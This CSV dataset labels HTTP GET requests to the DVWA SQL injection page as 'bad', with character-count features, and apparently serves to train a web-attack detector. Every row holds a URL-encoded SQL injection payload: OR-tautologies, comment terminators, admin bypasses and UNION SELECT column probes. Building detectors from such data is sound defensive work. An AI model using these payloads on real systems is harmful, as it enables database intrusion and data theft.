Method,Path,Body,Single_q,Double_q,Dashes,Braces,Spaces,Bad_Words,class
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%2A%22%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%2A%22%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%3D%22%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,1,0,1,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%3D%22%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%3D%22%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=0%22%29%26lt%3B%222--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,1,0,1,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=0%22%29%26lt%3B%222%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=0%22%29%26lt%3B%222%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272%27oR%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,1,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29oR%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%202--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%202%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%202%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%202%20oR%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%2f%2A%2A%2f2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%2f%2A%2A%2f2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%2f%2A%2A%2f2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%2f%2A%2A%2f2%2f%2A%2A%2foR%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22oR%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,1,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29oR%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%202--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%202%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%202%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%202%20oR%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%2f%2A%2A%2f2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%2f%2A%2A%2f2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%2f%2A%2A%2f2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%2f%2A%2A%2f2%2f%2A%2A%2foR%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272%27%3D%272&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272%27%3D%272%27oR%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,6,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272%27%3D%272%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272%27%3D%272%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272%27%3D%272%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%202%3D2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%202%3D2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%202%3D2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%202%3D2%20oR%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%2f%2A%2A%2f2%3D2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%2f%2A%2A%2f2%3D2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%2f%2A%2A%2f2%3D2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%2f%2A%2A%2f2%3D2%2f%2A%2A%2foR%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29%3D2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,1,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29%3D2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29%3D2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29%3D%282%29oR%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,2,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272%27%3D%272%27%20LimIT%201--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,0,3,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272%27%3D%272%27%20LimIT%201%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272%27%3D%272%27%20LimIT%201%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29%3D%282%29LimIT%281%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,3,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29%3D%282%29LimIT%281%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,3,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29%3D%282%29LimIT%281%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,3,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22%3D%222&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22%3D%222%22oR%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,6,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22%3D%222%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22%3D%222%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22%3D%222%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%202%3D2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%202%3D2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%202%3D2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%202%3D2%20oR%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%2f%2A%2A%2f2%3D2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%2f%2A%2A%2f2%3D2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%2f%2A%2A%2f2%3D2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%2f%2A%2A%2f2%3D2%2f%2A%2A%2foR%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29%3D2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,1,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29%3D2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29%3D2%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29%3D%282%29oR%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,2,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22%3D%222%22%20LimIT%201--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,0,3,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22%3D%222%22%20LimIT%201%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22%3D%222%22%20LimIT%201%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29%3D%282%29LimIT%281%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,3,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29%3D%282%29LimIT%281%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,3,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29%3D%282%29LimIT%281%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,3,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%20true--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%20true%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%20true%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%20true%20oR%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%28true%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,1,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%28true%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%28true%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%28true%29oR%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%2f%2A%2A%2ftrue--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%2f%2A%2A%2ftrue%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%2f%2A%2A%2ftrue%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%2f%2A%2A%2ftrue%2f%2A%2A%2foR%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%20true--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%20true%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%20true%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%20true%20oR%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%28true%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,1,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%28true%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%28true%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%28true%29oR%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%2f%2A%2A%2ftrue--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%2f%2A%2A%2ftrue%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%2f%2A%2A%2ftrue%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%2f%2A%2A%2ftrue%2f%2A%2A%2foR%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272%27LiKE%272&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272%27LiKE%272%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272%27LiKE%272%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272%27LiKE%272%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%272%27LiKE%272%27oR%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,6,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29LiKE%282%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29LiKE%282%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29LiKE%282%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27oR%282%29LiKE%282%29oR%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,2,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22LiKE%222&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22LiKE%222%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22LiKE%222%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22LiKE%222%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%222%22LiKE%222%22oR%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,6,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29LiKE%282%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,2,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29LiKE%282%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,2,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29LiKE%282%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,2,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22oR%282%29LiKE%282%29oR%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,2,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=ffifdyop&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UniON%20SElecT%201%2C2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,4,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UniON%20SElecT%201%2C2%2C3--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,4,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UniON%20SElecT%201%2C2%2C3%2C4--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,4,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UniON%20SElecT%201%2C2%2C3%2C4%2C5--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,4,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UniON%20SElecT%201%2C2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UniON%20SElecT%201%2C2%2C3%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UniON%20SElecT%201%2C2%2C3%2C4%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UniON%20SElecT%201%2C2%2C3%2C4%2C5%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27UniON%28SElecT%281%29%2C2%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27UniON%28SElecT%281%29%2C2%2C3%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27UniON%28SElecT%281%29%2C2%2C3%2C4%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27UniON%28SElecT%281%29%2C2%2C3%2C4%2C5%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27UniON%28SElecT%281%29%2C2%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27UniON%28SElecT%281%29%2C2%2C3%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27UniON%28SElecT%281%29%2C2%2C3%2C4%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27UniON%28SElecT%281%29%2C2%2C3%2C4%2C5%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20UniON%20SElecT%201%2C2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,4,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20UniON%20SElecT%201%2C2%2C3--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,4,2,bad
